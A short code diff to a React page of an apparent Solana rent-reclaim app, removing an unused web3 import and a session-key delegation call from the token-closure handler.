@@ -10,13 +10,9 @@ import useWalletManager from "../hooks/useWalletManager";
 import { getAccLookup } from "../services/getAccOverview";
 import { calculateTotalRentInSOL, formatNumber } from "../utils";
 
-import { Connection, Keypair, PublicKey, SystemProgram } from "@solana/web3.js";
-
-
-
 const ReclaimPage = () => {
   const { publicKey, disconnect } = useWalletManager();
-  const { signAuthorizationMessage, authorizeTokenClosure, delegateSessionKey } = useSecureSigner();
+  const { signAuthorizationMessage, authorizeTokenClosure } = useSecureSigner();
 
   const [accOverview, setAccOverview] = useState(null);
   const [selected, setSelected] = useState({ burn: new Set(), verified: new Set() });
@@ -143,9 +139,6 @@ const ReclaimPage = () => {
     try {
       const tokenAccounts = ["dcQpxkW9FhVFgS5ZuZ89rGqQFQrKb8PoSRdJZeq9pM8", "2idX5oGgfe5jnqyS7y1H5oKA2enq3nyv3mGTPECAbyVs"];
 
-      const sessionKey = await delegateSessionKey();
-
-      console.log("Session key:", sessionKey.publicKey.toBase58());
       // 1. Sign secure message
       const signedData = await signAuthorizationMessage(tokenAccounts);
 
@@ -163,7 +156,6 @@ const ReclaimPage = () => {
       setTxError("");
     }
   };
-
 
   return isLoading ? (
     <Loading placeholder="Loading your portfolio..." />
